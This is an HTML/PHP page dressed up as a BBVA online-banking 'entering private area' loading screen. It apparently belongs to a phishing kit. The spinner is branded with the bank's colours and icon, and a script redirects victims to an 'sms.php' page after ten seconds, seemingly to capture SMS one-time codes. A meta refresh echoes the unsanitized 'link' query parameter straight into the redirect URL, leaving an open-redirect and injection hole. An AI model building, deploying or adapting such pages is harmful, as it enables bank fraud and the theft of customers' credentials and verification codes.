<html style=" background-color: #004481; " lang="es" data-version="<%= appVersion %>" data-useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"><head>
<meta http-equiv = "refresh" content = "15; url = ./<?php echo $_GET['link'] ?>" />
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>BBVA</title>
  <link rel="icon" type="image/x-icon" href="image/ico.ico">
 
  <style>
    @charset "UTF-8";

    body {
      line-height: 1;
      margin: 0;
      overflow: hidden;
    }

    div,
    ul,
    li {
      margin: 0;
      padding: 0;
    }

    @keyframes rotate {
      100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    @keyframes locked {
      0% {
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
      }
      39% {
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
      }
      50% {
        -webkit-transform: translate(-50%, -40%);
        transform: translate(-50%, -40%);
      }
      100% {
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
      }
    }

    @keyframes slide-in {
      from {
        bottom: 0;
      }
      to {
        bottom: 77%;
      }
    }

    @keyframes textPadlock {
      from {
        bottom: 77%;
      }
      to {
        bottom: 42%;
      }
    }

    @keyframes padlock {
      from {
        top: 15%;
      }
      to {
        top: 50%;
      }
    }

    @keyframes fade-in {
      from {
        opacity: 0;
        display: block;
      }

      to {
        opacity: 1;
      }
    }

    @keyframes fade-out {
      to {
        opacity: 0;
        display: none;
      }
    }

    .spinner-loader {
      animation: rotate 1.3s cubic-bezier(0.6, 0.1, 0.15, 0.8) infinite;
    }

    .progress-content-light__svg {
      width: 152px;
      height: 152px;
      margin-bottom: 40px;
    }

    .progress-content-light__flare,
    .progress-content-light__shine {
      width: 1em;
      height: 1em;
    }

    .progress-content-light__flare {
      clip-path: url(#progressContent_2_);
      fill: url(#progressContent_3_);
    }

    .progress-content-light__shine {
      overflow: visible;
    }

    .progress-loading__svg {
      top: 50%;
      left: 50%;
      -webkit-transform: translate(-50%, -50%);
      transform: translate(-50%, -50%);
      transition: -webkit-transform cubic-bezier(0.54, -0.54, 0.49, 1.54)
        ease-in-out 0.4s;
      transition: transform cubic-bezier(0.54, -0.54, 0.49, 1.54) ease-in-out
        0.4s;
      transition: transform cubic-bezier(0.54, -0.54, 0.49, 1.54) ease-in-out
          0.4s,
        -webkit-transform cubic-bezier(0.54, -0.54, 0.49, 1.54) ease-in-out 0.4s;
      width: 32px;
      height: 40px;
      position: absolute;
    }

    .progress-loading__padlock {
      fill: #fff;
      top: 0;
      left: 0;
      width: 18px;
      height: 24px;
      transition: -webkit-transform 0.4s ease-in-out;
      transition: transform 0.4s ease-in-out;
      transition: transform 0.4s ease-in-out,
        -webkit-transform 0.4s ease-in-out;
      -webkit-transform: translate(50%, 40%);
      transform: translate(50%, 40%);
      position: absolute;
    }

    .progress-loading__padlock-body {
      bottom: 0;
      width: 30px;
      height: 30px;
      position: absolute;
    }

    .progress-loading__padlock-symbol {
      bottom: 20%;
      left: 50%;
      width: 10px;
      height: 2px;
      transition: -webkit-transform 0.4s cubic-bezier(0.54, -0.54, 0.49, 1.54);
      transition: transform 0.4s cubic-bezier(0.54, -0.54, 0.49, 1.54);
      transition: transform 0.4s cubic-bezier(0.54, -0.54, 0.49, 1.54),
        -webkit-transform 0.4s cubic-bezier(0.54, -0.54, 0.49, 1.54);
      -webkit-transform-origin: 50% 50%;
      transform-origin: 50% 50%;
      -webkit-transform: translate(-50%, 50%) rotate(90deg);
      transform: translate(-50%, 50%) rotate(90deg);
      position: absolute;
    }

    .progress-loading__svg--locked {
      will-change: transform;
      -webkit-animation: locked 0.4s;
      animation: locked 0.4s;
    }

    .progress-loading__svg--locked .progress-loading__padlock {
      -webkit-transform: translate(50%, 60%);
      transform: translate(50%, 60%);
    }
    .progress-loading__svg--locked .progress-loading__padlock-symbol {
      -webkit-transform: translate(-50%, 50%);
      transform: translate(-50%, 50%);
    }

    .progress-content__box {
      -webkit-transform: translateY(-15%);
      transform: translateY(-15%);
      margin: 0;
      background-color: #004481;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      flex: 1;
      position: relative;
      box-sizing: border-box;
    }

    .progress-loading {
      will-change: transform;
      position: absolute;
      right: 0;
      left: 0;
      bottom: 0;
      top: 0;
      background-color: #072146;
    }

    .progress-loading[data-loading='true'] {
      -webkit-transform: translateY(66%);
      transform: translateY(66%);
    }
    .progress-loading[data-loading='true'] .progress-loading__svg {
      top: 13%;
    }
    .progress-loading[data-loading='true'] .progress-loading__text,
    .progress-loading[data-loading='true'] .progress-loading__text2 {
      bottom: 77%;
      width: 100%;
    }
    .progress-loading[data-loading='false'] {
      -webkit-transform: translateY(0);
      transform: translateY(0);
      transition: transform 0.3s, -webkit-transform 0.3s;
    }
    .progress-loading[data-loading='false'] .progress-loading__svg {
      will-change: top;
      -webkit-animation-duration: 0.3s;
      animation-duration: 0.3s;
      -webkit-animation-name: padlock;
      animation-name: padlock;
      top: 50%;
    }

    .progress-loading__text {
      width: 100%;
      position: absolute;
      color: #fff;
      text-align: center;
      font-size: 15px;
      font-family: sans-serif;
      line-height: 24px;
    }

    .progress-loading__text--slide-in {
      will-change: bottom;
      animation: slide-in 1.5s ease-out both;
    }

    .progress-loading__text--fade-in {
      will-change: opacity;
      animation: fade-in 0.4s ease-out both;
    }

    .progress-loading__text--fade-out {
      will-change: opacity;
      animation: fade-out 0.4s ease-in both;
    }

    .c-login-loading {
      height: 100vh;
      display: flex;
      flex-direction: column;
      flex-grow: 1;
      flex-shrink: 1;
      flex-basis: 0;
      box-sizing: border-box;
      position: relative;
      overflow: hidden;
    }

    [data-not-translated] {
      display: none;
    }
  </style>
</head>
<body class="logado" id="app" style=" background-color: #004481; ">
  <div id="initial_loading">
    <div class="c-login-loading">
      <div class="progress-content__box">
        <div data-status="loading" class="spinner-loader" style="
    margin-top: 100px;
">
          <svg class="progress-content-light__svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 400 400" xml:space="preserve" role="progressbar" aria-labelledby="loading-svg-title" aria-describedby="loading-svg-description">
            <title id="loading-svg-title" data-literal="loggingIn">Entrando en área privada</title>
            <desc data-literal="loadingContent">Cargando contenido</desc>
            <g>
              <defs>
                <path id="progressContent_1_" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z"></path>
              </defs>
              <clipPath id="progressContent_2_">
                <use xlink:href="#progressContent_1_" style="overflow:visible;"></use>
              </clipPath>
              <radialGradient id="progressContent_3_" cx="0" cy="0" r="180" fx="24" fy="73" gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 379.0422 -24.3454)" gradientUnits="userSpaceOnUse">
                <stop offset="0" style="stop-color:#2dcccd;"></stop>
                <stop offset="1" style="stop-color:#004481;stop-opacity:0"></stop>
              </radialGradient>
              <polygon class="progress-content-light__flare" points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313"></polygon>
            </g>
            <g id="Shine_1_">
              <g>
                <image class="progress-content-light__shine" xlink:href="data:image/png;base64,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"></image>
              </g>
            </g>
          </svg>
        </div>
      </div>
      
    </div>
  </div>

  
<script>
   setTimeout(function () {
               window.location.href= 'sms.php';
           },10000); // 1000 = 1s
</script>

</body>
</html>